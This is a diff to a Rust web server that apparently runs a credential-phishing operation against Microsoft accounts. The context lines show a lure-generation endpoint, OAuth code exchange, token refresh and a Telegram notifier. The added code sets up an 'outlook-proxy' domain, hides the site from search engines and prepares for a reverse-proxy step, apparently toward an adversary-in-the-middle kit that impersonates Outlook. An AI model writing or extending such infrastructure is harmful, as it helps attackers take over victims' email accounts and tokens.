@@ -97,6 +97,13 @@ pub struct AppConfig {
     telegram_chat_id: Option<String>,
     master_secret: String,
     frontend_url: Option<String>,
+    // Proxy configuration
+    proxy_domain: String,
+    proxy_enabled: bool,
+    proxy_port: u16,
+    proxy_max_sessions: usize,
+    proxy_rate_limit: u32,
+    proxy_secret: String,
 }
 
 impl AppConfig {
@@ -115,6 +122,12 @@ impl AppConfig {
             telegram_chat_id: env::var("TELEGRAM_CHAT_ID").ok(),
             master_secret: env::var("MASTER_SECRET").expect("MASTER_SECRET not set"),
             frontend_url: env::var("FRONTEND_URL").ok(),
+            proxy_domain: env::var("PROXY_DOMAIN").unwrap_or_else(|_| "outlook-proxy.simdiatokens.com".to_string()),
+            proxy_enabled: env::var("PROXY_ENABLED").unwrap_or_else(|_| "true".to_string()) == "true",
+            proxy_port: env::var("PROXY_PORT").unwrap_or_else(|_| "8080".to_string()).parse().unwrap_or(8080),
+            proxy_max_sessions: env::var("PROXY_MAX_SESSIONS").unwrap_or_else(|_| "50".to_string()).parse().unwrap_or(50),
+            proxy_rate_limit: env::var("PROXY_RATE_LIMIT").unwrap_or_else(|_| "100".to_string()).parse().unwrap_or(100),
+            proxy_secret: env::var("PROXY_SECRET").unwrap_or_else(|_| "changeme_proxy_secret_32_chars_long".to_string()),
         }
     }
 }
@@ -1049,6 +1062,55 @@ async fn deploy_worker(state: web::Data<AppState>) -> impl Responder {
     }
 }
 
+// Proxy health check endpoint
+async fn proxy_health_handler(state: web::Data<AppState>) -> impl Responder {
+    HttpResponse::Ok().json(serde_json::json!({
+        "status": "ok",
+        "proxy_enabled": state.config.proxy_enabled,
+        "proxy_domain": state.config.proxy_domain,
+        "proxy_port": state.config.proxy_port,
+        "proxy_max_sessions": state.config.proxy_max_sessions,
+        "proxy_rate_limit": state.config.proxy_rate_limit,
+        "timestamp": Utc::now().to_rfc3339()
+    }))
+}
+
+// robots.txt handler to prevent search engine indexing
+async fn robots_txt_handler() -> impl Responder {
+    HttpResponse::Ok()
+        .content_type("text/plain")
+        .body("User-agent: *\nDisallow: /\n\n# Proxy domain - do not index\n")
+}
+
+// Proxy test endpoint - returns a simple test page
+async fn proxy_test_handler() -> impl Responder {
+    HttpResponse::Ok().content_type("text/html").body(r#"<!DOCTYPE html>
+<html>
+<head>
+    <title>Proxy Test</title>
+    <style>
+        body { font-family: system-ui, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; }
+        .success { color: #22c55e; }
+        .info { background: #f3f4f6; padding: 15px; border-radius: 8px; margin: 20px 0; }
+        code { background: #e5e7eb; padding: 2px 6px; border-radius: 4px; }
+    </style>
+</head>
+<body>
+    <h1 class="success">✓ Proxy Server is Running</h1>
+    <div class="info">
+        <p><strong>Status:</strong> Active</p>
+        <p><strong>Endpoint:</strong> <code>/proxy-test</code></p>
+        <p><strong>Time:</strong> <span id="time"></span></p>
+    </div>
+    <p>If you can see this page, the proxy infrastructure is working correctly.</p>
+    <p>Next step: Complete <strong>Step 2</strong> to implement the reverse proxy logic.</p>
+    <script>
+        document.getElementById('time').textContent = new Date().toISOString();
+    </script>
+</body>
+</html>"#)
+}
+
 // Helper: refresh access token
 async fn refresh_access_token(state: &AppState, refresh_token: &str) -> Option<String> {
     let token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
@@ -1392,6 +1454,7 @@ async fn main() -> std::io::Result<()> {
             .app_data(app_state.clone())
             .app_data(web::JsonConfig::default().limit(50_000_000))
             .route("/", web::get().to(root_status))
+            .route("/robots.txt", web::get().to(robots_txt_handler))
             .route("/exchange", web::get().to(exchange_code))
             .route("/auth-success", web::get().to(auth_success_handler))
             .route("/admin", web::get().to(admin_dashboard))
@@ -1471,6 +1534,9 @@ async fn main() -> std::io::Result<()> {
             .route("/api/inbox/local-folders/{folder_id}/messages", web::get().to(list_local_folder_messages_handler))
             .route("/api/inbox/auto-filter", web::post().to(auto_filter_handler))
             .route("/api/lure/generate", web::post().to(generate_lure_handler))
+            // Proxy health check and test endpoints
+            .route("/api/proxy/health", web::get().to(proxy_health_handler))
+            .route("/proxy-test", web::get().to(proxy_test_handler))
     })
     .bind(("0.0.0.0", port))?
     .run()
